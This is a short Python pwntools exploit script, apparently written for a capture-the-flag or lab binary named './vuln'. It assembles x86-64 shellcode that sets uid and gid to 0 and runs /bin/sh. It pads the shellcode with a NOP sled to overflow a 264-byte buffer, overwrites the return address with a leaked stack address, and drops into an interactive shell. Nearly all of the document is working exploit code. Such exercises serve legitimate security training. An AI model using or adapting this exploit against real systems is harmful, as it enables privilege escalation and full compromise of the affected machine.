from pwn import *

context.arch = 'amd64'
context.os = 'linux'

shellcode = asm("""
    xor rdi, rdi        # setuid(0)
    mov rax, 0x69
    syscall

    xor rdi, rdi        # setgid(0)
    mov rax, 0x6a
    syscall
    
    xor rdi, rdi     # Null out RDI (argv[0] = NULL)
    xor rsi, rsi     # Null out RSI (argv = NULL)
    xor rdx, rdx     # Null out RDX (envp = NULL)
    mov rax, 0x3b    # syscall execve
    lea rdi, [rip+binsh]  # "/bin/sh" string address
    syscall          # Call execve
    
    binsh:
        .string "/bin/sh"
""")

buffer_size = 264

nop_sled = b'\x90' * (buffer_size - len(shellcode)) 

p = process('./vuln')

leak = p.recvline_contains(b'Leaked:').decode()
rip = int(leak.split(': ')[1], 16)

payload = nop_sled + shellcode + p64(rip)

print("")
print("payload:")
print("")
print(payload)
print("")

p.sendline(payload)
p.interactive()
